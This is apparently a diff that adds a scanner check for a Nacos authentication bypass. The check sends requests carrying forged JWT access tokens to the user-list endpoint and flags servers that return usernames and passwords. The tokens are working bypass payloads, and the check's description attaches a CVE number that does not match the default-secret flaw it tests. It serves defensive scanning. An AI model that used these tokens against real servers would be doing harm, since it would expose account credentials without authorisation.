@@ -1,0 +1,29 @@
+metadata:
+    language: v1-beta
+    name: "Nacos User List Unauthorized Bypass"
+    description: "Nacos < 2.2.0 - Authentication Bypass CVE-2021-29441."
+    tags: "Unauthorized","Nacos"
+    author: "JaveleyQAQ"
+
+run for each:
+    nacos_detect =
+        `/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g`,
+        `/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDUwNDAxOX0.vW8mpBNoJ7hVKPNhEtQl4Z5b00G4P9Ktrn_7c58crOk`,
+        `/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g`,
+        `/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDUwNDAxOX0.vW8mpBNoJ7hVKPNhEtQl4Z5b00G4P9Ktrn_7c58crOk`
+
+given host then
+    send request called nacos:
+        method: "GET"
+        path: {nacos_detect}
+    if {nacos.response.status_code} is "200" and "application/json" in {nacos.response.headers} and "\"username\":" in {nacos.response.body} and "\"password\":" in {nacos.response.body} then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: `The authentication function of Nacos can be bypassed through the default JWT secret. Nacos < 2.2.0 - Authentication Bypass CVE-2021-29441`
+            remediation: "
+                - https://github.com/alibaba/nacos/issues/10060
+                - https://avd.aliyun.com/detail?id=AVD-2023-1655789
+                - https://nacos.io/zh-cn/docs/auth.html"
+    end if
+
